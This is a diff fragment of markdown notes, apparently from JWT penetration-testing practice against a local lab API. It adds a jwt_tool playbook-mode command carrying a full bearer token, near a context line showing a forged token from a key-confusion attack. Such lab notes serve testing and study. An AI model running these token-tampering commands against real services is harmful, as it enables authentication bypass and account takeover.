@@ -148,6 +148,18 @@ jwttool_fb724ea7181908c94f5a2607dc785cf2 - EXPLOIT: Key-Confusion attack (signin
 [+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzI0ODE4NTAsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTczMjQ5MDg1MCwidXNlcklkIjoic2VjdXJlc3RvcmUiLCJpc0FkbWluIjoiZmFsc2UifQ.Ma27_tZTWfFe1dR3w4713-eOA2xgkrLPpNe5pM9fPwg  
 ```
 
+### Playbook attacks
+
+Issues
+```shell
+jwt_tool -t http://localhost:8888//identity/api/v2/user/dashboard -rh "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMUB1c2VyMS5jb20iLCJpYXQiOjE3MzIwNjI2MzIsImV4cCI6MTczMjY2NzQzMiwicm9sZSI6InVzZXIifQ.VunjCXP8DcMDjVBg-8O4y3Dvih5UEHE1Evk9R4fKWQSFAxIEdFNW3W7jj14BIZwZ6FM71yYccVkrJLqj-yYLjO5pJZow2eTPupU4xkGzQ48e1Urv5WCPcfEQJco9x3tzBuhOc5zP3m_deP8P8kejPvdA2XBQNdHiSguuS-tfmj5SBdZk6bHnmIVfkCR3AS-SnSir2hFV_liqdWqAIN_0OvG7p2YtpIxgl9pjrqGNu0_I1POiC1R0LpeWSWbbV2MD_vH8ye5zzJxfstRjy0SZ78_UdH75p605lfIW9pCaeYOlWN6wiHRPPHUGABXLjfWWPKC4fSEytt2YiIbNyRUgsA" -M pb
+```
+
+Worked  
+set a shell variable
+```shell
+JWT="<JWT>"
+
 ### KID Attacks
 
 TBD
